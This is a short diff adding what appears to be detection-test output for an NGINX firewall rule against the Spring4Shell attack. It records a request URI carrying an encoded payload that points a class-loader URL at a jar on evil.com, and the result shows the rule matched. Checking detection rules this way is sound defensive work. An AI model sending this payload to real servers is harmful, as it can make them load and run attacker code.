@@ -1,0 +1,3 @@
+Expected Rule: [NGINX Emerging Threat] Spring4Shell attack
+Matched Rule: [NGINX Emerging Threat] Spring4Shell attack test_id=SSTI_SPRING_001-1772266826801-e06ugg pattern_id=SSTI_SPRING_001 uri=/?q=class.module.classLoader.URLs%5B0%5D%3Djar%3Ahttp%3A%2F%2Fevil.com client=127.0.0.1
+Rule Match: ✅ Match
